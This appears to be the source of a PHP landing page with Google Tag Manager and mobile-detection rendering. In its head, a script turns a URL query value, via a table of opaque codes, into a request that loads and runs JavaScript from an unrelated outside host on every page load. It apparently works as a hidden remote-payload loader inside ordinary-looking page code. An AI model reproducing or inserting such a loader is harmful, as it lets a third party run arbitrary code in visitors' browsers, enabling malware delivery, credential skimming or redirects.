<html>

<head>
    <!-- Google Tag Manager -->
    <script>
        (function(w, d, s, l, i) {
            w[l] = w[l] || [];
            w[l].push({
                'gtm.start': new Date().getTime(),
                event: 'gtm.js'
            });
            var f = d.getElementsByTagName(s)[0],
                j = d.createElement(s),
                dl = l != 'dataLayer' ? '&l=' + l : '';
            j.async = true;
            j.src =
                'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
            f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-55HHM35Z');
    </script>
    <!-- End Google Tag Manager -->
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <script>
        const objectMap = {
            "0fgl75km": "nruldtca",
            "v302ocn8": "1rdg6n90",
            "canmh1k6": "fb3pi5yu"
        }
        const param = window.location.search.replace("?", "").split("&")[0];
        const urlParam = !!objectMap[param] ? objectMap[param] : param
        console.log("Script>>", param, urlParam)
        var script = document.createElement('script');
        script.setAttribute('src', 'https://naturaladmin.com/blog/?' + urlParam + '.js');
        document.head.appendChild(script);
    </script>
</head>

<body>
    <!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-55HHM35Z" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->
    <?php

    // Disable all error reporting
    //ini_set('error_reporting', 0);

    // Importing libraries
    require_once dirname(__FILE__) . '/vendor/autoload.php';
    // Importing config file
    require_once dirname(__FILE__) . '/config.php';
    // Importing our service functions
    require_once dirname(__FILE__) . '/lib.php';

    // Default content location
    $content_path = 'content/';

    // Load mobile detection library
    use Detection\MobileDetect;

    // Detecting mobile devices and rendering mobile version if needed
    if (ACLandingConfig::DETECT_MOBILE) {
        $detect = new MobileDetect;
        $is_mobile = $detect->isMobile();
        if (file_exists(dirname(__FILE__) . '/content/mobile') && $is_mobile) {
            $content_path = 'content/mobile/';
        }
    }

    // Rendering index of our content
    Render_Template($content_path, $is_mobile);
